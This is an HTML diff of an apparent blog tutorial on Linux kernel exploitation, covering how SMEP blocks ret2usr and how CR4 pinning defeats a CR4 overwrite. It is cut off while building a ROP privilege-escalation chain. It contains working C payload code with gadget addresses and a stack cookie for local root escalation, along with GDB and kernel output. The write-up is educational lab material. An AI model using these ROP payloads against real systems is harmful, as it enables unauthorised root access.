@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Linux Kernel Exploitation Part 2: Adding Mitigitions - Arzedlab 🪵</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Building on Part 2, this article discusses the mitigations introduced to block ret2usr attacks, such as SMEP, SMAP, and hardened pointer validation. It examines how these protections change the exploitation landscape and what kernel developers must consider when designing secure code paths." />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="http://localhost:1313/posts/kernel-2-adding-mitigitions-2063648c0bf4808c81cec3f938783649/">
+  <meta property="og:site_name" content="Arzedlab 🪵">
+  <meta property="og:title" content="Linux Kernel Exploitation Part 2: Adding Mitigitions">
+  <meta property="og:description" content="Building on Part 2, this article discusses the mitigations introduced to block ret2usr attacks, such as SMEP, SMAP, and hardened pointer validation. It examines how these protections change the exploitation landscape and what kernel developers must consider when designing secure code paths.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-05T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-06-05T00:00:00+00:00">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Kernel">
+    <meta property="article:tag" content="SMEP">
+    <meta property="article:tag" content="ROP">
+    <meta property="article:tag" content="Exploitation">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Linux Kernel Exploitation Part 2: Adding Mitigitions">
+  <meta name="twitter:description" content="Building on Part 2, this article discusses the mitigations introduced to block ret2usr attacks, such as SMEP, SMAP, and hardened pointer validation. It examines how these protections change the exploitation landscape and what kernel developers must consider when designing secure code paths.">
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7198d56e4fe53ab4610aa7f913b8d3fa7453003ac7791c64a6d6157aecbbced5.css" />
+
+	
+	
+
+	
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">Arzedlab 🪵</a>
+	</div>
+	<nav>
+		
+		<a href="/">🏠 Home</a>
+		
+		<a href="/posts">🗂️ All posts</a>
+		
+		<a href="/about">💡 About Me</a>
+		
+		<a href="/papers">📑 Publications</a>
+		
+		<a href="/tags">🏷️ Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Linux Kernel Exploitation Part 2: Adding Mitigitions</h1>
+			<div class="meta">Posted on Jun 5, 2025</div>
+		</div>
+		
+
+		
+		<div class="toc">
+		<strong>Table of contents:</strong>
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#adding-smep"><strong>Adding SMEP</strong></a>
+      <ul>
+        <li><a href="#check-its-in-gdb">Check it&rsquo;s in gdb</a></li>
+        <li><a href="#the-attempt-to-overwrite-cr4"><strong>The attempt to overwrite CR4</strong></a></li>
+      </ul>
+    </li>
+    <li><a href="#building-a-complete-escalation-rop-chain"><strong>Building a complete escalation ROP chain</strong></a>
+      <ul>
+        <li><a href="#pivoting-the-stack"><strong>Pivoting the stack</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+		</div>
+
+		<section class="body">
+			<h1 id="kernel-2-adding-mitigitions">Kernel 2: Adding Mitigitions</h1>
+<h2 id="adding-smep"><strong>Adding SMEP</strong></h2>
+<p><code>SMEP</code>, abbreviated for <a href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf">Supervisor mode execution protection (SMEP)</a>, is a feature that marks all the userland pages in the page table as non-executable when the process is exectuting in <code>kernel-mode</code>. In the kernel, this is enabled by setting the <code>20th bit</code> of Control Register <code>CR4</code>.</p>
+<p><img src="image.png" alt="image.png"></p>
+<p><img src="image%201.png" alt="image.png"></p>
+<h3 id="check-its-in-gdb">Check it&rsquo;s in gdb</h3>
+<p>Run the qemu with <code>-s</code>  and on qemu boot, it can be enabled by adding <code>+smep</code> to <code>-cpu</code>, and disabled by adding <code>nosmep</code> to <code>-append</code>.</p>
+<p>Attach GDB:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb vmlinux
+</span></span></code></pre></div><p>Then in GDB:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">(</span>gdb<span style="color:#ff79c6">)</span> target remote :1234
+</span></span></code></pre></div><p>Read <code>CR4</code> Register:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">(</span>gdb<span style="color:#ff79c6">)</span> monitor info registers
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">RAX</span><span style="color:#ff79c6">=</span>ffffffff8101b4c0 <span style="color:#8be9fd;font-style:italic">RBX</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">RCX</span><span style="color:#ff79c6">=</span>ffff88800782c280 <span style="color:#8be9fd;font-style:italic">RDX</span><span style="color:#ff79c6">=</span>000000000000101e
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">RSI</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000083</span> <span style="color:#8be9fd;font-style:italic">RDI</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">RBP</span><span style="color:#ff79c6">=</span>ffffffff82003e18 <span style="color:#8be9fd;font-style:italic">RSP</span><span style="color:#ff79c6">=</span>ffffffff82003e18
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">R8</span> <span style="color:#ff79c6">=</span>ffff88800781efc0 <span style="color:#8be9fd;font-style:italic">R9</span> <span style="color:#ff79c6">=</span>000000000002ae00 <span style="color:#8be9fd;font-style:italic">R10</span><span style="color:#ff79c6">=</span>ffffffff82003e18 <span style="color:#8be9fd;font-style:italic">R11</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">R12</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">R13</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">R14</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">R15</span><span style="color:#ff79c6">=</span>ffffffff82013840
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">RIP</span><span style="color:#ff79c6">=</span>ffffffff8101b652 <span style="color:#8be9fd;font-style:italic">RFL</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">00000212</span> <span style="color:#ff79c6">[</span>----A--<span style="color:#ff79c6">]</span> <span style="color:#8be9fd;font-style:italic">CPL</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span> <span style="color:#8be9fd;font-style:italic">II</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span> <span style="color:#8be9fd;font-style:italic">A20</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> <span style="color:#8be9fd;font-style:italic">SMM</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span> <span style="color:#8be9fd;font-style:italic">HLT</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">ES</span> <span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">CS</span> <span style="color:#ff79c6">=</span><span style="color:#bd93f9">0010</span> <span style="color:#bd93f9">0000000000000000</span> ffffffff 00af9b00 <span style="color:#8be9fd;font-style:italic">DPL</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span> CS64 <span style="color:#ff79c6">[</span>-RA<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">SS</span> <span style="color:#ff79c6">=</span><span style="color:#bd93f9">0018</span> <span style="color:#bd93f9">0000000000000000</span> ffffffff 00cf9300 <span style="color:#8be9fd;font-style:italic">DPL</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span> DS   <span style="color:#ff79c6">[</span>-WA<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">DS</span> <span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">FS</span> <span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">GS</span> <span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000</span> ffff888007800000 <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LDT</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00008200</span> <span style="color:#8be9fd;font-style:italic">DPL</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span> LDT
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">TR</span> <span style="color:#ff79c6">=</span><span style="color:#bd93f9">0040</span> fffffe0000003000 <span style="color:#bd93f9">00004087</span> <span style="color:#bd93f9">00008900</span> <span style="color:#8be9fd;font-style:italic">DPL</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span> TSS64-avl
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">GDT</span><span style="color:#ff79c6">=</span>     fffffe0000001000 0000007f
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">IDT</span><span style="color:#ff79c6">=</span>     fffffe0000000000 00000fff
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">CR0</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">80050033</span> <span style="color:#8be9fd;font-style:italic">CR2</span><span style="color:#ff79c6">=</span>00007fffa1611ac8 <span style="color:#8be9fd;font-style:italic">CR3</span><span style="color:#ff79c6">=</span>00000000064b6000 <span style="color:#8be9fd;font-style:italic">CR4</span><span style="color:#ff79c6">=</span>001006f0
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">DR0</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">DR1</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">DR2</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">DR3</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> 
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">DR6</span><span style="color:#ff79c6">=</span>00000000ffff0ff0 <span style="color:#8be9fd;font-style:italic">DR7</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000400</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">EFER</span><span style="color:#ff79c6">=</span>0000000000000d01
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">FCW</span><span style="color:#ff79c6">=</span>037f <span style="color:#8be9fd;font-style:italic">FSW</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000</span> <span style="color:#ff79c6">[</span><span style="color:#8be9fd;font-style:italic">ST</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">]</span> <span style="color:#8be9fd;font-style:italic">FTW</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">00</span> <span style="color:#8be9fd;font-style:italic">MXCSR</span><span style="color:#ff79c6">=</span>00001f80
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">FPR0</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000</span> <span style="color:#8be9fd;font-style:italic">FPR1</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">FPR2</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000</span> <span style="color:#8be9fd;font-style:italic">FPR3</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">FPR4</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000</span> <span style="color:#8be9fd;font-style:italic">FPR5</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">FPR6</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000</span> <span style="color:#8be9fd;font-style:italic">FPR7</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">XMM00</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">XMM01</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">XMM02</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">XMM03</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">XMM04</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">XMM05</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">XMM06</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">XMM07</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">XMM08</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">XMM09</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">XMM10</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">XMM11</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">XMM12</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">XMM13</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">XMM14</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span> <span style="color:#8be9fd;font-style:italic">XMM15</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0000000000000000</span> <span style="color:#bd93f9">0000000000000000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">(</span>gdb<span style="color:#ff79c6">)</span> p/t <span style="color:#8be9fd;font-style:italic">$cr4</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$5</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">100000000011011110000</span>
+</span></span></code></pre></div><p><img src="image%202.png" alt="image.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Bit index:  <span style="color:#bd93f9">20</span>        <span style="color:#bd93f9">19</span> <span style="color:#bd93f9">18</span> <span style="color:#bd93f9">17</span> <span style="color:#bd93f9">16</span> <span style="color:#bd93f9">15</span> <span style="color:#bd93f9">14</span> <span style="color:#bd93f9">13</span> <span style="color:#bd93f9">12</span> <span style="color:#bd93f9">11</span> <span style="color:#bd93f9">10</span>  <span style="color:#bd93f9">9</span>  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">7</span>  <span style="color:#bd93f9">6</span>  <span style="color:#bd93f9">5</span>  <span style="color:#bd93f9">4</span>  <span style="color:#bd93f9">3</span>  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">1</span>  <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>Binary:     <span style="color:#bd93f9">1</span>         <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">1</span>  <span style="color:#bd93f9">1</span>   <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">1</span>  <span style="color:#bd93f9">1</span>  <span style="color:#bd93f9">1</span>  <span style="color:#bd93f9">1</span>  <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">0</span>
+</span></span></code></pre></div><p>As we can see, 20’s bit is 1 which means <code>SMEP</code> is turned on (Yes, we count bits from <strong>right to left</strong> because of how <strong>binary numbers</strong> are structured in computer systems)</p>
+<p>Recall from the last part, where we achieved root privileges using a piece of code that we wrote ourselves, this strategy won’t be viable anymore with <code>SMEP</code> on. The reason is because our piece of code retains in <code>user-space</code>, and as I have explained above, <code>SMEP</code> has already marked the page which contains our code as non-executable when the process is executing in <code>kernel-mode</code>.</p>
+<p>Recall further back to when most of us learned userland pwn, this is effectively the same as setting <code>NX</code> bit to make the stack non-executable. That is the time when we were introduced to <code>Return-oriented programming (ROP)</code> after learning <code>ret2shellcode</code>. The same concept applies with kernel exploitation, I will now introduce <code>kernel ROP</code> after having introduced <code>ret2usr</code>.</p>
+<h3 id="the-attempt-to-overwrite-cr4"><strong>The attempt to overwrite CR4</strong></h3>
+<p>As I have mentioned above, in the kernel, the 20th bit of Control Register <code>CR4</code> is responsible for enabling or disabling <code>SMEP</code>. And, while executing in <code>kernel-mode</code>, we have the power to modify the content of this register with asm instructions such as <code>mov cr4, rdi</code>. Instruction such as that comes from a function called <code>native_write_cr4()</code>, which overwrites the content of <code>CR4</code> with its parameter, and it resides in the kernel itself. So my first attempt to bypass <code>SMEP</code> is to ROP into <code>native_write_cr4(value)</code>, where <code>value</code> is set to clear the 20th bit of <code>CR4</code>.</p>
+<p>The same as <code>commit_creds()</code> and <code>prepare_kernel_cred()</code>, we can find the address of that function by reading <code>/proc/kallsyms</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /proc/kallsyms | grep native_write_cr4
+</span></span><span style="display:flex;"><span>-&gt; ffffffff814443e0 T native_write_cr4
+</span></span></code></pre></div><p>The way we build a ROP chain in the kernel is exactly the same as in userland. So here, instead of immediately return into our userland code, we will return into <code>native_write_cr4(value)</code>, then return to our privileges escalation code. For the current value of <code>CR4</code>, we can get it by either causing a kernel panic and it will be dumped out (or attaching a debugger to the kernel)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">[</span>    3.794861<span style="color:#ff79c6">]</span> CR2: 0000000000401fd9 CR3: 000000000657c000 CR4: 00000000001006f0
+</span></span></code></pre></div><p>We will clear the 20th bit, which is at the position of <code>0x100000</code>, our <code>value</code> will be <code>0x6f0</code>. Our payload will be as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> pop_rdi_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff81006370</span>;
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> native_write_cr4 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff814443e0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">overflow</span>(<span style="color:#8be9fd">void</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> n <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">50</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> payload[n];
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> off <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">16</span>;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> cookie;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// r12
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>; <span style="color:#6272a4">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> pop_rdi_ret; <span style="color:#6272a4">// return address
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x6f0</span>;
+</span></span><span style="display:flex;"><span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> native_write_cr4; <span style="color:#6272a4">// native_write_cr4(0x6f0), effectively clear the 20th bit
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    payload[off<span style="color:#ff79c6">++</span>] <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span>)escalate_privs;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;[*] Prepared payload&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">ssize_t</span> w <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">write</span>(global_fd, payload, <span style="color:#ff79c6">sizeof</span>(payload));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;[!] Should never be reached&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>For gadgets such as <code>pop rdi ; ret</code>, we can easily find them by grepping the <code>gadgets.txt</code> file that was generated by running <code>ROPgadget</code> on the kernel image in the first post.</p>
+<blockquote>
+<p><em>It seems that in the kernel image file <code>vmlinux</code>, there is no information about whether a region is executable or not, so <code>ROPgadget</code> will attempt to find all the gadgets that exist in the binary, even the non-executable ones. If you try to use a gadget and the kernel crashes because it is non-executable, you just have to try another one.</em></p>
+</blockquote>
+<p>In theory, running this should give us a root shell. However, in reality, the kernel still crashes, and even more confusing, the reason for the crash is <code>SMEP</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>unable to execute userspace <span style="color:#50fa7b">code</span> (SMEP<span style="color:#ff79c6">?</span>) (<span style="color:#8be9fd;font-style:italic">uid</span>: <span style="color:#bd93f9">0</span>)
+</span></span></code></pre></div><p><img src="image%203.png" alt="image.png"></p>
+<p>Why is <code>SMEP</code> still active if we have already cleared the 20th bit? I decided to use <code>dmesg</code> to find out if there is anything weird happens to <code>CR4</code>, and I found this line:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[    <span style="color:#bd93f9">3.767510</span>] pinned CR4 bits <span style="color:#8be9fd;font-style:italic">changed</span>: <span style="color:#bd93f9">0x100000</span><span style="color:#ff79c6">!?</span>
+</span></span></code></pre></div><p>It seems like the 20th bit of <code>CR4</code> is somehow pinned. I then proceeded to Google for the source code of <code>native_write_cr4()</code> and other resources to clarify the situation. Here is the source code:</p>
+<p><a href="https://elixir.bootlin.com/linux/v6.15/source/arch/x86/kernel/cpu/common.c#L427">https://elixir.bootlin.com/linux/v6.15/source/arch/x86/kernel/cpu/common.c#L427</a></p>
+<p><img src="image%204.png" alt="image.png"></p>
+<p>Reading the mentioned resources, it is clear that in newer kernel versions, the 20th and 21st bits of <code>CR4</code> are pinned on boot, and will immediately be set again after being cleared, so <em><strong>they can never be overwritten this way anymore!</strong></em></p>
+<p>So my first attempt was a fail. At least we now know that even though we have the power to overwrite <code>CR4</code> in <code>kernel-mode</code>, the kernel developers have already awared of it and prohibited us from using such thing to exploit the kernel. Let’s move on to develop a stronger exploitation that will actually work.</p>
+<h2 id="building-a-complete-escalation-rop-chain"><strong>Building a complete escalation ROP chain</strong></h2>
+<p>In this second attempt, we will get rid of the idea of getting root privileges by running our own code completely, and try to achieve it by using ROP only. The plan is straightforward:</p>
+<ol>
+<li>ROP into <code>prepare_kernel_cred(0)</code>.</li>
+<li>ROP into <code>commit_creds()</code>, with the return value from step 1 as a parameter.</li>
+<li>ROP into <code>swapgs ; ret</code>.</li>
+<li>ROP into <code>iretq</code> with the stack setup as <code>RIP|CS|RFLAGS|SP|SS</code>.</li>
+</ol>
+<p>The ROP chain itself is not complicated at all, but there are still some hiccups in building it. Firstly, as I mentioned above, there are a lot of gadgets that <code>ROPgadget</code> found but are unusable. Therefore, I had to do a lot of trials and errors and finally ended up using these gadgets to move the return value in step 1 (stored in <code>rax</code>) into <code>rdi</code> to pass to <code>commit_creds()</code>, they might seem a bit bizarre, but all of the ordinary gadgets that I tried are non-executable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> pop_rdx_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff81007616</span>; <span style="color:#6272a4">// pop rdx ; ret
